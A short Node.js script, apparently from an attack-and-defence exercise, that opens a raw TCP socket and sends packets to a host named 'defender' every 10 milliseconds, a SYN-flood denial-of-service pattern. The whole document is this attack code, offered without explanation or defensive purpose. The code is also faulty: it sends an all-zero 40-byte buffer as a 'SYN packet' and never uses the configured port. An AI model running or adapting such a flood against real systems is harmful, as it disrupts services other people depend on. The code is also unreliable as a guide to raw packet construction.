
const raw = require('raw-socket');
const socket = raw.createSocket({ protocol: raw.Protocol.TCP });
const target = { address: 'defender', port: 8080 };

const sendSynPacket = () => {
    const buffer = Buffer.alloc(40); // TCP header length
    socket.send(buffer, 0, buffer.length, target.address, () => {});
};

setInterval(sendSynPacket, 10);
